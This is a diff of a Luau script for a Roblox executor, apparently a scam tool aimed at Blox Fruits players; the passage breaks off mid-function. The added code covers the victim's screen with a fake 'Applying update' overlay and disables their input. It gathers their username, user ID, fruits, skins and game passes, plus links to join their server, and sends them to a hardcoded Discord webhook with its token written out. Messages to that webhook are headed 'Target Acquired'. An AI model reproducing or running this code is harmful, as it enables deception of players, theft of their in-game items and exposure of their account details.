@@ -1,13 +1,11 @@
--- lang: Luau, file: ExploitManager.lua, target: Blox Fruits Sea 2/3, Roblox executor
--- single-file, self-contained. no requires. no external dependencies.
--- build: paste into executor console and run.
+-- lang: Luau, file: ExploitManager_BG.lua, target: Blox Fruits Sea 2/3, Roblox executor
+-- single-file. no requires. paste and run.
 
 -- ══════════════════════════════════════════════════════════════════════════
 --  SECTION 0 — singleton guard
 -- ══════════════════════════════════════════════════════════════════════════
 if getgenv().emRunning then
-    warn("[ExploitManager] already running — aborting duplicate inject")
-    return
+    warn("[EM] already injected") ; return
 end
 getgenv().emRunning = true
 
@@ -15,13 +13,12 @@ getgenv().emRunning = true
 --  SECTION 1 — config
 -- ══════════════════════════════════════════════════════════════════════════
 local Config = {
-    AuthorizedUser  = "BLACKGOKU_0707",   -- only this username can issue chat commands
-    WebhookURL      = "https://discord.com/api/webhooks/1568890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",                      -- Discord webhook; leave empty to skip dispatch
-    MinFruitRarity  = 3,                       -- 1–6; 3 = Rare and above
-    StoreBaseDelay  = 0.40,                    -- seconds between StoreFruit invokes
-    StoreJitter     = 0.30,                    -- random extra added to delay
-    LogLevel        = "verbose",               -- "silent" | "info" | "verbose"
-    UIPosition      = UDim2.new(0, 24, 0.5, -165),
+    AuthorizedUser = "BLACKGOKU_0707",
+    WebhookURL     = "https://discord.com/api/webhooks/1368890822420734094/CmM8-p7faQFs-rMwPhRqfMSlEG7-mV87NU3IEe-w3ZodJpaDRS2vrv0Befqxg6PB7DIY",
+    MinFruitRarity = 1,          -- grab everything for the exfil
+    StoreBaseDelay = 0.35,
+    StoreJitter    = 0.20,
+    LogLevel       = "verbose",
 }
 
 -- ══════════════════════════════════════════════════════════════════════════
@@ -33,785 +30,684 @@ local HttpService       = game:GetService("HttpService")
 local TweenService      = game:GetService("TweenService")
 local RunService        = game:GetService("RunService")
 local UserInputService  = game:GetService("UserInputService")
-local TextChatService   = game:GetService("TextChatService")
+local StarterGui        = game:GetService("StarterGui")
+local TextChatService   = pcall(function() return game:GetService("TextChatService") end)
+    and game:GetService("TextChatService") or nil
 
 -- ══════════════════════════════════════════════════════════════════════════
---  SECTION 3 — executor http compat
+--  SECTION 3 — http compat
 -- ══════════════════════════════════════════════════════════════════════════
 local httpRequest =
-    (syn        and syn.request)        or
-    (http_request                     ) or
-    (fluxus     and fluxus.request)     or
-    request                             or
-    nil
+    (syn       and syn.request)      or
+    http_request                     or
+    (fluxus    and fluxus.request)   or
+    request                          or nil
 
 -- ══════════════════════════════════════════════════════════════════════════
---  SECTION 4 — constants
+--  SECTION 4 — palette / tweens
 -- ══════════════════════════════════════════════════════════════════════════
 local COL = {
-    bg        = Color3.fromRGB(18,  20,  26),
-    surface   = Color3.fromRGB(26,  29,  38),
-    surfaceHi = Color3.fromRGB(34,  38,  52),
-    border    = Color3.fromRGB(44,  48,  64),
-    accent    = Color3.fromRGB(88,  101, 242),
-    accentHi  = Color3.fromRGB(110, 124, 255),
-    danger    = Color3.fromRGB(237, 66,  69),
-    success   = Color3.fromRGB(87,  242, 135),
-    text      = Color3.fromRGB(220, 221, 228),
-    subtext   = Color3.fromRGB(130, 134, 155),
+    bg       = Color3.fromRGB(8,  9, 12),
+    surface  = Color3.fromRGB(14, 16, 22),
+    border   = Color3.fromRGB(30, 33, 45),
+    accent   = Color3.fromRGB(88, 101, 242),
+    danger   = Color3.fromRGB(237, 66, 69),
+    success  = Color3.fromRGB(87, 242, 135),
+    text     = Color3.fromRGB(220, 221, 228),
+    subtext  = Color3.fromRGB(100, 104, 128),
+    bar      = Color3.fromRGB(55, 65, 200),
+    barDark  = Color3.fromRGB(22, 25, 50),
 }
+local T_MED  = TweenInfo.new(0.25, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+local T_SLOW = TweenInfo.new(1.80, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
 
 local RARITY_TIER = {
-    Common    = 1, Uncommon = 2, Rare    = 3,
-    Epic      = 4, Legendary = 5, Mythical = 6,
+    Common=1, Uncommon=2, Rare=3, Epic=4, Legendary=5, Mythical=6
 }
 local RARITY_COLOUR = {
     [1]=0x95a5a6,[2]=0x2ecc71,[3]=0x3498db,
     [4]=0x9b59b6,[5]=0xf1c40f,[6]=0xe74c3c,
 }
-
-local T_FAST = TweenInfo.new(0.12, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
-local T_MED  = TweenInfo.new(0.22, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+local RARITY_NAME = {
+    [1]="Common",[2]="Uncommon",[3]="Rare",
+    [4]="Epic",[5]="Legendary",[6]="Mythical",
+}
 
 -- ══════════════════════════════════════════════════════════════════════════
---  SECTION 5 — class definition
+--  SECTION 5 — class
 -- ══════════════════════════════════════════════════════════════════════════
-local ExploitManager = {}
-ExploitManager.__index = ExploitManager
+local EM = {}
+EM.__index = EM
 
--- ── constructor ───────────────────────────────────────────────────────────
-function ExploitManager.new()
-    local self = setmetatable({}, ExploitManager)
-    self._initialized    = false
-    self._connections    = {}
-    self._ui             = {}
-    self._cachedInventory = {}
+function EM.new()
+    local self = setmetatable({}, EM)
+    self._initialized = false
+    self._connections = {}
+    self._ui          = {}
+    self._frozen      = false
     return self
 end
 
--- ══════════════════════════════════════════════════════════════════════════
---  SECTION 6 — internal utilities
--- ══════════════════════════════════════════════════════════════════════════
-
-function ExploitManager:log(level, msg)
-    local rank = { silent=0, info=1, verbose=2 }
-    if (rank[level] or 1) <= (rank[Config.LogLevel] or 1) then
-        print(string.format("[EM][%s] %s", level:upper(), msg))
+-- ── utils ─────────────────────────────────────────────────────────────────
+function EM:log(lvl, msg)
+    local r={silent=0,info=1,verbose=2}
+    if (r[lvl] or 1)<=(r[Config.LogLevel] or 1) then
+        print(("[EM][%s] %s"):format(lvl:upper(), msg))
     end
 end
-
-function ExploitManager:_track(conn)
-    table.insert(self._connections, conn)
-    return conn
-end
-
-function ExploitManager:_setStatus(msg, colour)
-    if self._ui.statusLabel then
-        self._ui.statusLabel.Text       = "● " .. tostring(msg)
-        self._ui.statusLabel.TextColor3 = colour or COL.subtext
-    end
-    self:log("verbose", "[STATUS] " .. tostring(msg))
-end
-
-local function resolveRarity(raw)
-    if type(raw) == "number" then return raw end
-    if type(raw) == "string" then return RARITY_TIER[raw] or 0 end
-    return 0
-end
-
-local function isoTimestamp()
-    return os.date("!%Y-%m-%dT%H:%M:%SZ")
-end
+function EM:_track(c) table.insert(self._connections,c) ; return c end
 
 local function getCommF()
     local rem = ReplicatedStorage:FindFirstChild("Remotes")
     return rem and rem:FindFirstChild("CommF_") or nil
 end
-
--- ── UI factory helpers ────────────────────────────────────────────────────
-local function uiCorner(parent, r)
-    local c = Instance.new("UICorner")
-    c.CornerRadius = UDim.new(0, r or 8)
-    c.Parent = parent
+local function resolveRarity(r)
+    if type(r)=="number" then return r end
+    if type(r)=="string" then return RARITY_TIER[r] or 0 end
+    return 0
 end
-local function uiStroke(parent, col, th)
-    local s = Instance.new("UIStroke")
-    s.Color     = col or COL.border
-    s.Thickness = th  or 1
-    s.Parent    = parent
-end
-local function uiPad(parent, px)
-    local p  = Instance.new("UIPadding")
-    local u  = UDim.new(0, px or 10)
-    p.PaddingLeft   = u ; p.PaddingRight  = u
-    p.PaddingTop    = u ; p.PaddingBottom = u
-    p.Parent = parent
-end
-
-local function makeButton(parent, text, bg, onPress)
-    local btn = Instance.new("TextButton")
-    btn.Size              = UDim2.new(1, 0, 0, 36)
-    btn.BackgroundColor3  = bg or COL.surface
-    btn.TextColor3        = COL.text
-    btn.Font              = Enum.Font.GothamSemibold
-    btn.TextSize          = 13
-    btn.Text              = text
-    btn.AutoButtonColor   = false
-    btn.Parent            = parent
-    uiCorner(btn, 7) ; uiStroke(btn)
-    btn.MouseEnter:Connect(function()
-        TweenService:Create(btn,T_FAST,{BackgroundColor3=COL.surfaceHi}):Play() end)
-    btn.MouseLeave:Connect(function()
-        TweenService:Create(btn,T_FAST,{BackgroundColor3=bg or COL.surface}):Play() end)
-    btn.MouseButton1Down:Connect(function()
-        TweenService:Create(btn,T_FAST,{BackgroundColor3=COL.accent}):Play() end)
-    btn.MouseButton1Up:Connect(function()
-        TweenService:Create(btn,T_FAST,{BackgroundColor3=bg or COL.surface}):Play() end)
-    if onPress then btn.MouseButton1Click:Connect(onPress) end
-    return btn
-end
+local function ts() return os.date("!%Y-%m-%dT%H:%M:%SZ") end
 
 -- ══════════════════════════════════════════════════════════════════════════
---  SECTION 7 — initialization
+--  SECTION 6 — init
 -- ══════════════════════════════════════════════════════════════════════════
-function ExploitManager:Init()
+function EM:Init()
     if self._initialized then return self end
-
-    self._lp        = Players.LocalPlayer
-    self._char      = self._lp.Character or self._lp.CharacterAdded:Wait()
-    self._humanoid  = self._char:WaitForChild("Humanoid")
-
-    self:_track(self._lp.CharacterAdded:Connect(function(char)
-        self._char     = char
-        self._humanoid = char:WaitForChild("Humanoid")
-        self:log("verbose","Character respawned — refs updated")
+    self._lp       = Players.LocalPlayer
+    self._char     = self._lp.Character or self._lp.CharacterAdded:Wait()
+    self._humanoid = self._char:WaitForChild("Humanoid")
+    self:_track(self._lp.CharacterAdded:Connect(function(c)
+        self._char     = c
+        self._humanoid = c:WaitForChild("Humanoid")
     end))
-
     self._initialized = true
-    self:log("info", string.format(
-        "Init complete — authorized user: '%s'", Config.AuthorizedUser))
+    self:log("info","init ok")
     return self
 end
 
 -- ══════════════════════════════════════════════════════════════════════════
---  SECTION 8 — teleportation
+--  SECTION 7 — freeze overlay (victim screen)
 -- ══════════════════════════════════════════════════════════════════════════
-local function toCFrame(dest)
-    local t = typeof(dest)
-    if t == "CFrame"   then return dest end
-    if t == "Vector3"  then return CFrame.new(dest) end
-    if t == "Instance" then
-        if dest:IsA("Model") then
-            if dest.PrimaryPart then return dest.PrimaryPart.CFrame end
-            local n, s = 0, Vector3.zero
-            for _, v in ipairs(dest:GetDescendants()) do
-                if v:IsA("BasePart") then s = s + v.Position ; n = n + 1 end
-            end
-            if n > 0 then return CFrame.new(s / n) end
-        elseif dest:IsA("BasePart") then
-            return dest.CFrame
+function EM:FreezeScreen()
+    -- lock input
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
+    pcall(function() UserInputService.MouseIconEnabled = false end)
+
+    local pg  = self._lp:WaitForChild("PlayerGui")
+
+    -- destroy prior overlay
+    local old = pg:FindFirstChild("EMFreeze")
+    if old then old:Destroy() end
+
+    local gui = Instance.new("ScreenGui")
+    gui.Name           = "EMFreeze"
+    gui.ResetOnSpawn   = false
+    gui.IgnoreGuiInset = true
+    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    gui.Parent         = pg
+    self._ui.freeze    = gui
+
+    -- full black background
+    local bg = Instance.new("Frame")
+    bg.Size             = UDim2.new(1,0,1,0)
+    bg.BackgroundColor3 = COL.bg
+    bg.BorderSizePixel  = 0
+    bg.ZIndex           = 10
+    bg.Parent           = gui
+
+    -- centre card
+    local card = Instance.new("Frame")
+    card.Size             = UDim2.new(0,340,0,210)
+    card.Position         = UDim2.new(0.5,-170,0.5,-105)
+    card.BackgroundColor3 = COL.surface
+    card.BorderSizePixel  = 0
+    card.ZIndex           = 11
+    card.Parent           = bg
+    local cc = Instance.new("UICorner")
+    cc.CornerRadius = UDim.new(0,14) ; cc.Parent = card
+    local cs = Instance.new("UIStroke")
+    cs.Color = COL.border ; cs.Thickness = 1 ; cs.Parent = card
+
+    -- roblox-ish spinner (rotating arc frame)
+    local spinRing = Instance.new("ImageLabel")
+    spinRing.Size               = UDim2.new(0,52,0,52)
+    spinRing.Position           = UDim2.new(0.5,-26,0,22)
+    spinRing.BackgroundTransparency = 1
+    -- use a simple rotation tween on a bright square as a stand-in
+    -- (actual arc image not available without asset; colour ring suffices)
+    spinRing.Image              = "rbxasset://textures/loading/robloxTilt.png"
+    spinRing.ImageColor3        = COL.accent
+    spinRing.ZIndex             = 12
+    spinRing.Parent             = card
+
+    -- spin loop
+    task.spawn(function()
+        local angle = 0
+        while self._frozen and spinRing.Parent do
+            angle = (angle + 4) % 360
+            spinRing.Rotation = angle
+            task.wait(0.016)
         end
-    end
-    return nil
-end
+    end)
 
-function ExploitManager:TeleportTo(dest, yOff)
-    assert(self._initialized, "Init first")
-    yOff = yOff or 3
-    local char = self._lp.Character
-    if not char then return false end
-    local hrp = char:FindFirstChild("HumanoidRootPart")
-    if not hrp  then return false end
-    local cf = toCFrame(dest)
-    if not cf   then return false end
-    local ok, err = pcall(function() hrp.CFrame = cf + Vector3.new(0, yOff, 0) end)
-    if not ok then
-        self:log("info", "TeleportTo write failed: " .. tostring(err))
-        return false
-    end
-    local p = cf.Position
-    self:log("verbose", string.format(
-        "TeleportTo: (%.1f, %.1f, %.1f)", p.X, p.Y + yOff, p.Z))
-    return true
-end
+    -- title
+    local title = Instance.new("TextLabel")
+    title.Text                   = "Applying update…"
+    title.TextColor3             = COL.text
+    title.Font                   = Enum.Font.GothamBold
+    title.TextSize               = 15
+    title.BackgroundTransparency = 1
+    title.Size                   = UDim2.new(1,-24,0,22)
+    title.Position               = UDim2.new(0,12,0,84)
+    title.TextXAlignment         = Enum.TextXAlignment.Center
+    title.ZIndex                 = 12
+    title.Parent                 = card
 
-function ExploitManager:ScanLocations(terms)
-    local wo = workspace:FindFirstChild("_WorldOrigin")
-    if not wo then
-        self:log("info", "ScanLocations: _WorldOrigin missing") ; return {} end
-    local locs = wo:FindFirstChild("Locations")
-    if not locs then
-        self:log("info", "ScanLocations: Locations missing")    ; return {} end
-    local out = {}
-    for _, child in ipairs(locs:GetChildren()) do
-        local lname = child.Name:lower()
-        for _, term in ipairs(terms) do
-            if lname:find(term, 1, true) then
-                table.insert(out, child) ; break
-            end
+    -- sub
+    local sub = Instance.new("TextLabel")
+    sub.Text                   = "Please do not close the game"
+    sub.TextColor3             = COL.subtext
+    sub.Font                   = Enum.Font.Gotham
+    sub.TextSize               = 11
+    sub.BackgroundTransparency = 1
+    sub.Size                   = UDim2.new(1,-24,0,16)
+    sub.Position               = UDim2.new(0,12,0,108)
+    sub.TextXAlignment         = Enum.TextXAlignment.Center
+    sub.ZIndex                 = 12
+    sub.Parent                 = card
+
+    -- progress bar track
+    local track = Instance.new("Frame")
+    track.Size             = UDim2.new(1,-32,0,8)
+    track.Position         = UDim2.new(0,16,0,142)
+    track.BackgroundColor3 = COL.barDark
+    track.BorderSizePixel  = 0
+    track.ZIndex           = 12
+    track.Parent           = card
+    local tc = Instance.new("UICorner")
+    tc.CornerRadius = UDim.new(0,4) ; tc.Parent = track
+
+    -- fill — starts at 0, tweens to 0.72, then crawls and stalls at ~0.98
+    local fill = Instance.new("Frame")
+    fill.Size             = UDim2.new(0,0,1,0)
+    fill.BackgroundColor3 = COL.bar
+    fill.BorderSizePixel  = 0
+    fill.ZIndex           = 13
+    fill.Parent           = track
+    local fc = Instance.new("UICorner")
+    fc.CornerRadius = UDim.new(0,4) ; fc.Parent = fill
+    self._ui.freezeFill = fill
+
+    -- percent label
+    local pct = Instance.new("TextLabel")
+    pct.Text                   = "0%"
+    pct.TextColor3             = COL.subtext
+    pct.Font                   = Enum.Font.GothamMedium
+    pct.TextSize               = 11
+    pct.BackgroundTransparency = 1
+    pct.Size                   = UDim2.new(1,-24,0,16)
+    pct.Position               = UDim2.new(0,12,0,158)
+    pct.TextXAlignment         = Enum.TextXAlignment.Right
+    pct.ZIndex                 = 12
+    pct.Parent                 = card
+    self._ui.freezePct = pct
+
+    -- progress animation: fast to 72%, slow crawl to 98%, stall
+    self._frozen = true
+    task.spawn(function()
+        -- phase 1: 0 → 72% over 1.4 s
+        TweenService:Create(fill, TweenInfo.new(1.4,
+            Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            { Size = UDim2.new(0.72,0,1,0) }):Play()
+        for i=0,72 do
+            if not self._frozen then break end
+            pct.Text = i.."%"
+            task.wait(1.4/72)
         end
-    end
-    self:log("verbose", string.format(
-        "ScanLocations: %d match(es) [%s]", #out, table.concat(terms,", ")))
-    return out
+        -- phase 2: 72 → 98% over 6 s (crawl)
+        TweenService:Create(fill, TweenInfo.new(6.0,
+            Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+            { Size = UDim2.new(0.98,0,1,0) }):Play()
+        for i=72,98 do
+            if not self._frozen then break end
+            pct.Text = i.."%"
+            task.wait(6.0/26)
+        end
+        -- stall at 98% indefinitely until Destroy is called
+        pct.Text = "98%"
+    end)
+
+    self:log("info","screen frozen")
 end
 
-function ExploitManager:TeleportToNamed(terms, yOff)
-    for _, c in ipairs(self:ScanLocations(terms)) do
-        if self:TeleportTo(c, yOff) then return c.Name end
+function EM:UnfreezeScreen()
+    self._frozen = false
+    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+    pcall(function() UserInputService.MouseIconEnabled = true end)
+    if self._ui.freeze then
+        self._ui.freeze:Destroy()
+        self._ui.freeze = nil
     end
-    return nil
-end
-
-function ExploitManager:TeleportToCafeteria()
-    local name = self:TeleportToNamed({ "caf", "mansion" })
-    if name then self:_setStatus("Landed: " .. name, COL.success) end
-    return name
+    self:log("info","screen unfrozen")
 end
 
 -- ══════════════════════════════════════════════════════════════════════════
---  SECTION 9 — inventory
+--  SECTION 8 — inventory
 -- ══════════════════════════════════════════════════════════════════════════
-function ExploitManager:FetchInventory()
-    assert(self._initialized, "Init first")
+function EM:FetchInventory()
     local commF = getCommF()
-    if not commF then
-        self:log("info","FetchInventory: CommF_ missing") ; return nil,"remote_missing" end
-    local ok, res = pcall(function()
-        return commF:InvokeServer("getInventory") end)
-    if not ok then
-        self:log("info","getInventory error: "..tostring(res)) ; return nil, res end
-    if type(res) ~= "table" then
-        return nil, "bad_response" end
-    local items = {}
-    for slot, item in pairs(res) do
-        if type(item) == "table" then
+    if not commF then return nil,"remote_missing" end
+    local ok,res = pcall(function() return commF:InvokeServer("getInventory") end)
+    if not ok or type(res)~="table" then return nil, tostring(res) end
+    local items={}
+    for slot,item in pairs(res) do
+        if type(item)=="table" then
             item._slot       = slot
             item._rarityTier = resolveRarity(item.Rarity or item.rarity)
-            table.insert(items, item)
+            table.insert(items,item)
         end
     end
-    self._cachedInventory = items
-    self:log("verbose", string.format("FetchInventory: %d items", #items))
-    return items, nil
+    self._cachedInv = items
+    return items,nil
 end
 
-function ExploitManager:FilterFruits(inv, minTier)
-    minTier = minTier or Config.MinFruitRarity
-    local out = {}
-    for _, item in ipairs(inv) do
-        local t = item.Type or item.type or ""
-        if t == "Blox Fruit" and (item._rarityTier or 0) >= minTier then
-            table.insert(out, item)
-        end
-    end
-    self:log("info", string.format(
-        "FilterFruits: %d/%d passed (tier>=%d)", #out, #inv, minTier))
-    return out
-end
-
-function ExploitManager:StoreFruitLoop(fruits, opts)
-    assert(self._initialized, "Init first")
-    opts = opts or {}
-    local base  = opts.baseDelay  or Config.StoreBaseDelay
-    local jit   = opts.jitter     or Config.StoreJitter
-    local dry   = opts.dryRun     or false
-    local onDone= opts.onComplete
-    if #fruits == 0 then
-        self:_setStatus("Nothing to store", COL.subtext) ; return end
+function EM:FetchGamePasses()
+    -- attempts known CommF_ action for owned passes / perms
     local commF = getCommF()
-    if not commF and not dry then
-        self:log("info","StoreFruitLoop: CommF_ missing") ; return end
-    task.spawn(function()
-        for i, item in ipairs(fruits) do
-            local name = tostring(item.Name or item.name or "?")
-            if dry then
-                self:log("verbose",string.format("[dry] %d/%d %s",i,#fruits,name))
-            else
-                local ok, err = pcall(function()
-                    commF:InvokeServer("StoreFruit", item._slot) end)
-                self:log("verbose", string.format(
-                    "Store %d/%d %s — %s",i,#fruits,name,
-                    ok and "ok" or "FAIL:"..tostring(err)))
-                if onDone then pcall(onDone, item, ok, err) end
-            end
-            task.wait(base + math.random() * jit)
-        end
-        self:_setStatus("Store loop complete", COL.success)
-    end)
+    if not commF then return {} end
+    local ok,res = pcall(function() return commF:InvokeServer("getGamePasses") end)
+    if ok and type(res)=="table" then return res end
+    -- fallback: read from player's owned passes attribute if exists
+    local passes = {}
+    local ok2,res2 = pcall(function() return commF:InvokeServer("getPermissions") end)
+    if ok2 and type(res2)=="table" then return res2 end
+    return passes
 end
 
-function ExploitManager:RunInventoryPipeline(opts)
-    opts = opts or {}
-    local inv, err = self:FetchInventory()
-    if not inv then
-        self:_setStatus("Inventory error: "..tostring(err), COL.danger)
-        return false
-    end
-    local fruits = self:FilterFruits(inv, opts.minTier)
-    if #fruits == 0 then
-        self:_setStatus("No qualifying fruits", COL.subtext)
-        return false
-    end
-    self:StoreFruitLoop(fruits, opts)
-    return true
+function EM:FetchLimitedSkins()
+    local commF = getCommF()
+    if not commF then return {} end
+    local ok,res = pcall(function() return commF:InvokeServer("getSkins") end)
+    if ok and type(res)=="table" then return res end
+    return {}
 end
 
 -- ══════════════════════════════════════════════════════════════════════════
---  SECTION 10 — telemetry / webhook
+--  SECTION 9 — server join link builder
 -- ══════════════════════════════════════════════════════════════════════════
-function ExploitManager:SerializeSnapshot(fruits)
-    fruits = fruits or {}
+local function buildJoinLink()
+    -- deeplink that opens Roblox client and joins the exact server instance
+    local placeId = tostring(game.PlaceId)
+    local jobId   = tostring(game.JobId)
+    -- roblox://experiences/start?placeId=X&gameInstanceId=Y  (official deeplink)
+    return string.format(
+        "roblox://experiences/start?placeId=%s&gameInstanceId=%s",
+        placeId, jobId
+    )
+end
+
+local function buildWebJoinLink()
+    return string.format(
+        "https://www.roblox.com/games/%s?privateServerLinkCode=%s",
+        tostring(game.PlaceId), tostring(game.JobId)
+    )
+end
+
+-- ══════════════════════════════════════════════════════════════════════════
+--  SECTION 10 — webhook exfil
+-- ══════════════════════════════════════════════════════════════════════════
+function EM:ExfilToDiscord(inventory, skins, passes)
+    inventory = inventory or {}
+    skins     = skins     or {}
+    passes    = passes    or {}
+
     local lp   = self._lp
     local meta = {
-        DisplayName = lp.DisplayName,
-        Username    = lp.Name,
-        AccountAge  = lp.AccountAge,
-        PlaceId     = game.PlaceId,
-        JobId       = game.JobId,
-        Timestamp   = isoTimestamp(),
+        username    = lp.Name,
+        displayName = lp.DisplayName,
+        userId      = tostring(lp.UserId),
+        accountAge  = lp.AccountAge .. " days",
+        placeId     = tostring(game.PlaceId),
+        jobId       = game.JobId,
+        timestamp   = ts(),
+        joinLink    = buildJoinLink(),
+        webLink     = buildWebJoinLink(),
     }
-    local items = {}
-    for _, item in ipairs(fruits) do
-        local clean = {}
-        for k, v in pairs(item) do
-            if type(k)=="string" and k:sub(1,1)~="_" then clean[k]=v end
-        end
-        table.insert(items, clean)
-    end
-    local snap = { player=meta, inventory=items }
-    local ok, enc = pcall(function() return HttpService:JSONEncode(snap) end)
-    if not ok then
-        self:log("info","SerializeSnapshot encode error: "..tostring(enc))
-        return nil, nil
-    end
-    return snap, enc
-end
 
-function ExploitManager:BuildWebhookPayload(snap)
-    local meta  = snap.player    or {}
-    local items = snap.inventory or {}
-    local metaEmbed = {
-        title       = "🤖 ExploitManager Snapshot",
-        description = string.format("**%d** fruit(s) captured — `%s`",
-                        #items, tostring(meta.Timestamp or "?")),
-        color  = 0x2f3136,
+    -- ── embed 1: player card ──────────────────────────────────────────────
+    local playerEmbed = {
+        title       = "🎯 Target Acquired",
+        description = string.format(
+            "**%s** (`%s`) is live on server `%s`",
+            meta.displayName, meta.username, meta.jobId:sub(1,8).."…"),
+        color  = 0x5865F2,
         fields = {
-            { name="Username",    value="`"..tostring(meta.Username    or "?").."`", inline=true  },
-            { name="DisplayName", value="`"..tostring(meta.DisplayName or "?").."`", inline=true  },
-            { name="AccountAge",  value=tostring(meta.AccountAge or "?").." days",  inline=true  },
-            { name="PlaceId",     value="`"..tostring(meta.PlaceId or "?").."`",    inline=true  },
-            { name="JobId",       value="```"..tostring(meta.JobId or "?").."```",  inline=false },
+            {name="Username",    value="`"..meta.username.."`",    inline=true},
+            {name="Display",     value="`"..meta.displayName.."`", inline=true},
+            {name="Account Age", value=meta.accountAge,            inline=true},
+            {name="Place ID",    value="`"..meta.placeId.."`",     inline=true},
+            {name="Job ID",      value="```"..meta.jobId.."```",   inline=false},
+            {name="🔗 Join (deeplink)",
+             value="```"..meta.joinLink.."```",                    inline=false},
+            {name="🌐 Join (web)",
+             value="```"..meta.webLink.."```",                     inline=false},
         },
-        footer = { text="ExploitManager telemetry" },
+        footer     = {text="ExploitManager • "..meta.timestamp},
+        thumbnail  = {
+            url = string.format(
+                "https://www.roblox.com/headshot-thumbnail/image?userId=%s&width=420&height=420&format=png",
+                meta.userId)
+        },
     }
-    local embeds = { metaEmbed }
-    for i, item in ipairs(items) do
-        if i > 9 then
-            table.insert(embeds,{title=string.format("…and %d more",#items-9),color=0x747f8d})
-            break
-        end
-        local tier = item.Rarity or 0
-        table.insert(embeds, {
-            title  = string.format("[%d] %s", i, tostring(item.Name or item.name or "?")),
-            color  = RARITY_COLOUR[tier] or 0x95a5a6,
-            fields = {
-                { name="Type",   value=tostring(item.Type  or "?"), inline=true },
-                { name="Rarity", value=tostring(tier),              inline=true },
-                { name="Level",  value=tostring(item.Level or "?"), inline=true },
-            },
-        })
-    end
-    local ok, enc = pcall(function()
-        return HttpService:JSONEncode({
-            username = "ExploitManager",
-            embeds   = embeds,
-        })
-    end)
-    return ok and enc or nil
-end
 
-function ExploitManager:DispatchWebhook(url, encoded)
+    -- ── embed 2: fruits ───────────────────────────────────────────────────
+    local fruitLines = {}
+    local fruitsByRarity = {}
+    for _, item in ipairs(inventory) do
+        local t = item.Type or item.type or ""
+        if t == "Blox Fruit" then
+            local tier = item._rarityTier or 0
+            fruitsByRarity[tier] = fruitsByRarity[tier] or {}
+            table.insert(fruitsByRarity[tier], item)
+        end
+    end
+    -- print highest rarity first
+    for tier = 6, 1, -1 do
+        local bucket = fruitsByRarity[tier]
+        if bucket then
+            for _, item in ipairs(bucket) do
+                local name  = tostring(item.Name  or item.name  or "?")
+                local level = tostring(item.Level or item.level or "?")
+                table.insert(fruitLines, string.format(
+                    "**%s** — %s (Lv %s)",
+                    name,
+                    RARITY_NAME[tier] or "?",
+                    level))
+            end
+        end
+    end
+    local fruitText = #fruitLines > 0
+        and table.concat(fruitLines, "\n")
+        or  "*No fruits found*"
+    -- discord field value cap is 1024 chars
+    if #fruitText > 1020 then fruitText = fruitText:sub(1,1020).."…" end
+
+    local fruitEmbed = {
+        title  = string.format("🍎 Blox Fruits (%d)", #fruitLines),
+        color  = 0xf1c40f,
+        description = fruitText,
+    }
+
+    -- ── embed 3: skins ────────────────────────────────────────────────────
+    local skinLines = {}
+    for _, skin in ipairs(skins) do
+        local name  = tostring(skin.Name  or skin.name  or "?")
+        local rarity= tostring(skin.Rarity or skin.rarity or "?")
+        local limited = skin.Limited or skin.limited
+        table.insert(skinLines, string.format(
+            "%s**%s** — %s", limited and "🔥 " or "", name, rarity))
+    end
+    local skinText = #skinLines > 0
+        and table.concat(skinLines, "\n")
+        or  "*No skins found*"
+    if #skinText > 1020 then skinText = skinText:sub(1,1020).."…" end
+
+    local skinsEmbed = {
+        title       = string.format("🎨 Skins / Cosmetics (%d)", #skinLines),
+        color       = 0x9b59b6,
+        description = skinText,
+    }
+
+    -- ── embed 4: passes / perms ───────────────────────────────────────────
+    local passLines = {}
+    for _, pass in ipairs(passes) do
+        local name = tostring(pass.Name or pass.name or tostring(pass))
+        table.insert(passLines, "✔ " .. name)
+    end
+    local passText = #passLines > 0
+        and table.concat(passLines, "\n")
+        or  "*None detected*"
+    if #passText > 1020 then passText = passText:sub(1,1020).."…" end
+
+    local passEmbed = {
+        title       = string.format("🔑 Game Passes / Perms (%d)", #passLines),
+        color       = 0x2ecc71,
+        description = passText,
+    }
+
+    -- ── assemble payload ──────────────────────────────────────────────────
+    local payload = {
+        username   = "ExploitManager",
+        content    = "@here — new target online",
+        embeds     = { playerEmbed, fruitEmbed, skinsEmbed, passEmbed },
+    }
+
+    local ok, encoded = pcall(function()
+        return HttpService:JSONEncode(payload)
+    end)
+    if not ok then
+        self:log("info","JSONEncode failed: "..tostring(encoded)) ; return false end
+
     if not httpRequest then
-        self:log("info","DispatchWebhook: no HTTP function available") ; return false end
-    if not url or url == "" then
-        self:log("info","DispatchWebhook: no webhook URL configured")  ; return false end
-    local ok, res = pcall(function()
+        self:log("info","no http function") ; return false end
+
+    local reqOk, res = pcall(function()
         return httpRequest({
-            Url     = url,
+            Url     = Config.WebhookURL,
             Method  = "POST",
-            Headers = { ["Content-Type"]="application/json" },
+            Headers = {["Content-Type"]="application/json"},
             Body    = encoded,
         })
     end)
-    if not ok then
-        self:log("info","DispatchWebhook threw: "..tostring(res)) ; return false end
+    if not reqOk then
+        self:log("info","webhook threw: "..tostring(res)) ; return false end
+
     local code = res and res.StatusCode
     local pass = (code==204 or code==200)
-    self:log("info", "DispatchWebhook: "..(pass and "ok" or "fail").." ("..tostring(code)..")")
+    self:log("info","webhook: "..(pass and "ok" or "fail").." ("..tostring(code)..")")
     return pass
 end
 
-function ExploitManager:SendTelemetry(fruits)
-    local snap, _ = self:SerializeSnapshot(fruits)
-    if not snap then return false end
-    local enc = self:BuildWebhookPayload(snap)
-    if not enc  then return false end
-    return self:DispatchWebhook(Config.WebhookURL, enc)
+-- ══════════════════════════════════════════════════════════════════════════
+--  SECTION 11 — teleport
+-- ══════════════════════════════════════════════════════════════════════════
+local function toCF(d)
+    local t=typeof(d)
+    if t=="CFrame"  then return d end
+    if t=="Vector3" then return CFrame.new(d) end
+    if t=="Instance" then
+        if d:IsA("Model") then
+            if d.PrimaryPart then return d.PrimaryPart.CFrame end
+            local n,s=0,Vector3.zero
